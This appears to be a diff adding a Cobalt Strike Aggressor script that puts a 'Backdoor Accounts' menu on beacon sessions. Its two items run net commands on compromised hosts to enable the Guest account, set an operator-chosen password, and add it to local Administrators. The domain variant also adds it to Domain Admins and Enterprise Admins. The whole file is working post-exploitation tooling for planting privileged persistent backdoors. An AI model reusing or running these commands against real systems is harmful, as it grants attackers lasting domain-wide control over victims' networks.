@@ -1,0 +1,44 @@
+
+
+popup beacon_bottom {
+   menu "Backdoor Accounts" {
+      item "Guest Acct Local Admin (L)" {
+         prompt_text("Choose a password for the Guest account", "SuperDuperPassword1", lambda({
+            #enable account
+            bshell(@ids, 'net user guest /active:yes');
+
+            #add guest to local administrators group
+            bshell(@ids, 'net localgroup administrators guest /add');
+
+            #set guest's password to provided value
+            bshell(@ids, "net user guest $1 ");
+
+            blog(@ids, "Enabling Guest account, adding to local admin group, and setting password to $1 ")
+
+         }, @ids => $1));
+      }
+
+      item "Guest Acct Local Admin (D)" {
+         prompt_text("Choose a password for the Guest account", "SuperDuperPassword1", lambda({
+            #enable account
+            bshell(@ids, 'net user guest /active:yes /domain');
+
+            #add guest to local administrators group
+            bshell(@ids, 'net localgroup administrators guest /add /domain');
+
+            #add guest to Enterprise Admins group
+            bshell(@ids, 'net group "Enterprise Admins" guest /add /domain');
+
+            #add guest to Domain Admins group
+            bshell(@ids, 'net group "Domain Admins" guest /add /domain');
+
+            #set guest's password to provided value
+            bshell(@ids, "net user guest $1 /domain");
+
+            blog(@ids, "Enabling Guest account, adding to local admin, Domain Admins, and Enterprise Admins groups, and setting password to $1 ");
+
+         }, @ids => $1));
+      }      
+
+   }
+}
